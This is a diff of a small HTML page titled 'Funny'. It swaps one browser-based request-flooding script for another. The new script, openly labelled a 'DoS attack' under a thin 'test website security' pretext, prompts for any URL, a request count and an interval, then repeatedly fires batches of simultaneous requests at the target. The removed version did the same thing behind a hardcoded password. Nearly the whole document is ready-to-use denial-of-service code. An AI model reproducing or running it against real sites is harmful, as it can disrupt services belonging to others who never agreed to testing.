@@ -4,61 +4,49 @@
     <title>Funny</title>
 </head>
 <body>
-    <p>Password:</p>
-    <input type="text" id="password" name="username">
-    <button id="submit" onClick="mango()">Login</button>
-    <p id="iterationDisplay">Iteration: 0</p>
-
 <script>
-let password = "";
-let targetUrl = 'https://yourwebsite.com';
-let iteration = 0;
+// DoS Script to Test Website Security
 
-function mango() {
-    password = document.getElementById('password').value;
-    if (password === "javascript") {
-        const websiteUrl = prompt("Enter the website URL:");
-        if (websiteUrl) {
-            targetUrl = normalizeUrl(websiteUrl);
-            testWebsiteSecurity();
-        }
-    } else {
-        alert("Incorrect password");
-    }
-}
+// Configuration
+const url = prompt('Full website URL'); // Replace with your website URL
+const numRequests = prompt('Total requests, 1000 is good'); // Number of simultaneous requests
+const interval = prompt('interval in milliseconds, 10 is good'); // Time interval in milliseconds between requests
 
-function normalizeUrl(url) {
-    // Remove 'https://' or 'http://' if present
-    url = url.replace(/^https?:\/\//, '');
-
-    // Remove 'www.' if present
-    url = url.replace(/^www\./, '');
-
-    // Add 'https://www.' if not already present
-    if (!url.startsWith('https://') && !url.startsWith('http://')) {
-        url = 'https://www.' + url;
-    }
-
-    return url;
-}
-
-function testWebsiteSecurity() {
-    for (let i = 0; i < 10; i++) { // Send 10 requests simultaneously
+// Function to create a request
+function createRequest() {
+    return new Promise((resolve, reject) => {
         const xhr = new XMLHttpRequest();
-        xhr.open('GET', targetUrl, true);
+        xhr.open('GET', url, true);
+        xhr.onload = function () {
+            if (xhr.status >= 200 && xhr.status < 300) {
+                resolve('Success');
+            } else {
+                reject('Error');
+            }
+        };
+        xhr.onerror = function () {
+            reject('Error');
+        };
         xhr.send();
-    }
-
-    // Dynamically create and execute a new infinite loop
-    const newLoop = new Function('iteration', `
-        while (password === "javascript") {
-            testWebsiteSecurity();
-            iteration ++;
-            document.getElementById('iterationDisplay').textContent = 'Iteration: ' + iteration;
-        }
-    `);
-    newLoop(iteration);
+    });
 }
+
+// Function to perform DoS attack
+async function performDoS() {
+    const requests = [];
+    for (let i = 0; i < numRequests; i++) {
+        requests.push(createRequest());
+    }
+    try {
+        await Promise.all(requests);
+        alert('All requests completed successfully');
+    } catch (error) {
+        alert('Some requests failed:', error);
+    }
+}
+
+// Start the DoS attack
+setInterval(performDoS, interval);
 </script> <!-- Empty script tag -->
 </body>
 </html>
